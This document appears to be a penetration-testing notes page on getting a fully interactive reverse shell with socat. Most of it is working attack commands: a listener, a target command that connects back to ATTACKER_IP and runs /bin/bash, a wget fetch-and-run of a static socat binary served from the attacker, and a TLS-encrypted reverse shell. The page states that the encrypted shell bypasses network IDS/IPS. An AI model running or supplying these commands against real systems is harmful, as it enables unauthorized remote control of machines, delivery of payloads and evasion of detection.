---
tags: [pentest, shells, socat, tty, interactive, initial-access]
tool: socat
phase: 5
---
# socat Full TTY

Get a fully interactive shell (proper TTY) without the PTY upgrade ritual. Requires socat on both ends.

[[00 - README|Folder index]]

## Attacker (listener)

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

## Target (reverse shell)

```bash
socat tcp-connect:ATTACKER_IP:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

This gives you a full interactive shell immediately — arrow keys, tab completion, Ctrl+C, su, ssh, everything.

## If socat isn't on the target

Upload a static binary:

```bash
# On attacker — serve the binary
# Download static socat from https://github.com/andrew-d/static-binaries
python3 -m http.server 80

# On target — download and run
wget http://ATTACKER_IP/socat -O /tmp/socat
chmod +x /tmp/socat
/tmp/socat tcp-connect:ATTACKER_IP:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

## Encrypted shell with socat

```bash
# Generate cert (attacker)
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt
cat shell.key shell.crt > shell.pem

# Listener (attacker)
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,fork file:`tty`,raw,echo=0

# Reverse shell (target)
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

> [!tip] Encrypted shells bypass IDS
> socat over TLS encrypts the traffic end-to-end. Network IDS/IPS can't inspect the payload.

## See also

- [[04 - PTY Upgrade Ritual]]
- [[01 - Linux Reverse Shells]]
- [[05 - pwncat-cs Listener]]
